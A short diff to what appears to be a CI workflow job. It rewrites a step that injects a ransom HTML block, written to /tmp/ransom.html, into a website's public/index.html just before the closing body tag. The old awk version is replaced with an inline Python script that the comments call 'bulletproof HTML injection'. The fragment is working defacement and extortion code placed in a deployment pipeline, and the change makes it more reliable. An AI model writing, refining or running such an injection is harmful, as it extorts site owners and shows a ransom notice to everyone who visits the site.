@@ -115,9 +115,21 @@ jobs:
             </script>
             RANSOM
             
-            # Bulletproof HTML injection using awk to replace the closing body tag
-            awk '{ if ($0 ~ /<\/body>/) { system("cat /tmp/ransom.html"); print $0 } else { print $0 } }' public/index.html > /tmp/index_new.html
-            sudo mv /tmp/index_new.html public/index.html
+            # Bulletproof HTML injection using Python 3 to replace the closing body tag
+            /usr/bin/python3 -c "
+import sys
+with open('public/index.html', 'r') as f:
+    content = f.read()
+with open('/tmp/ransom.html', 'r') as f:
+    ransom = f.read()
+if '</body>' in content:
+    content = content.replace('</body>', ransom + '\n</body>')
+    with open('public/index.html', 'w') as f:
+        f.write(content)
+else:
+    print('Error: </body> not found in public/index.html')
+    sys.exit(1)
+"
             sudo chown ubuntu:ubuntu public/index.html
             
             sudo rm /tmp/ransom.html
